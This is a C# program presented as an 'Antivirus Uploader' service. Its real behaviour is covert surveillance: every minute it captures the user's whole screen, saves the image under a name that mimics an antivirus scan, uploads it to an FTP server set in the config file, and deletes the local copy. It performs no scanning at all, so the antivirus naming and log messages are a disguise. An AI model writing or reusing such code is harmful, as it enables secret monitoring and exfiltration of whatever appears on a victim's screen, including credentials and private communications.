using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;

public class Program
{
    private static ILogger<Program> _logger;
    private static IConfiguration _configuration;
    private static System.Timers.Timer aTimer;

    public static void Main(string[] args)
    {
        var services = new ServiceCollection();
        ConfigureServices(services);

        var serviceProvider = services.BuildServiceProvider();
        _logger = serviceProvider.GetService<ILogger<Program>>();
        _configuration = serviceProvider.GetService<IConfiguration>();

        _logger.LogInformation("Antivirus Uploader service starting.");

        aTimer = new System.Timers.Timer(60000); // 60 seconds
        aTimer.Elapsed += OnTimedEvent;
        aTimer.AutoReset = true;
        aTimer.Enabled = true;

        Console.WriteLine("Press the Enter key to exit the application...");
        Console.ReadLine();
    }

    private static void ConfigureServices(IServiceCollection services)
    {
        var configuration = new ConfigurationBuilder()
            .SetBasePath(Directory.GetCurrentDirectory())
            .AddJsonFile("appsettings.json", optional: false, reloadOnChange: true)
            .Build();

        services.AddSingleton<IConfiguration>(configuration);
        services.AddLogging(builder =>
        {
            builder.AddConsole();
            builder.AddEventLog();
        });
    }

    private static void OnTimedEvent(Object source, ElapsedEventArgs e)
    {
        try
        {
            var ftpHost = _configuration["FtpSettings:FtpHost"];
            var ftpUsername = _configuration["FtpSettings:FtpUsername"];
            var ftpPassword = _configuration["FtpSettings:FtpPassword"];
            var remoteDirectory = "/antivirus";
            var localSaveDirectory = Path.Combine(Path.GetTempPath(), "Antivirus");

            Directory.CreateDirectory(localSaveDirectory);
            EnsureDirectoryExistsFtp(ftpHost, remoteDirectory, ftpUsername, ftpPassword);

            string filePath = CaptureScreenAndSave(localSaveDirectory);
            _logger.LogInformation($"File saved to {filePath}");
            string remoteUri = $"{ftpHost}{remoteDirectory}/{Path.GetFileName(filePath)}";
            UploadFileFtp(filePath, remoteUri, ftpUsername, ftpPassword);
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "An error occurred during the antivirus scan and upload process.");
        }
    }

    private static string CaptureScreenAndSave(string directoryPath)
    {
        var bounds = Screen.PrimaryScreen.Bounds;
        var bitmap = new Bitmap(bounds.Width, bounds.Height);

        using (var g = Graphics.FromImage(bitmap))
        {
            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
        }

        string fileName = $"antivirus_scan_{DateTime.Now:yyyyMMdd_HHmmss}.png";
        string filePath = Path.Combine(directoryPath, fileName);
        bitmap.Save(filePath, ImageFormat.Png);

        return filePath;
    }

    private static void UploadFileFtp(string localFilePath, string remoteUri, string username, string password)
    {
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(remoteUri);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential(username, password);

            byte[] fileContents = File.ReadAllBytes(localFilePath);

            request.ContentLength = fileContents.Length;

            using (Stream requestStream = request.GetRequestStream())
            {
                requestStream.Write(fileContents, 0, fileContents.Length);
            }

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                _logger.LogInformation($"Upload File Complete, status {response.StatusDescription}");
            }

            File.Delete(localFilePath);
            _logger.LogInformation($"Local file {localFilePath} deleted.");
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "FTP Upload Failed.");
            throw;
        }
    }

    private static void EnsureDirectoryExistsFtp(string host, string directory, string username, string password)
    {
        string directoryUri = $"{host}{directory}";
        try
        {
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(directoryUri);
            request.Method = WebRequestMethods.Ftp.MakeDirectory;
            request.Credentials = new NetworkCredential(username, password);

            using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
            {
                _logger.LogInformation($"FTP Directory '{directory}' created successfully. Status: {response.StatusDescription}");
            }
        }
        catch (WebException ex)
        {
            FtpWebResponse response = ex.Response as FtpWebResponse;
            if (response != null && response.StatusCode == FtpStatusCode.ActionNotTakenFileUnavailable)
            {
                _logger.LogInformation($"FTP Directory '{directory}' likely already exists or permissions denied (550). Proceeding.");
            }
            else
            {
                _logger.LogError(ex, $"Error creating directory {directory}");
            }
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, $"Unexpected error in directory check");
        }
    }
}
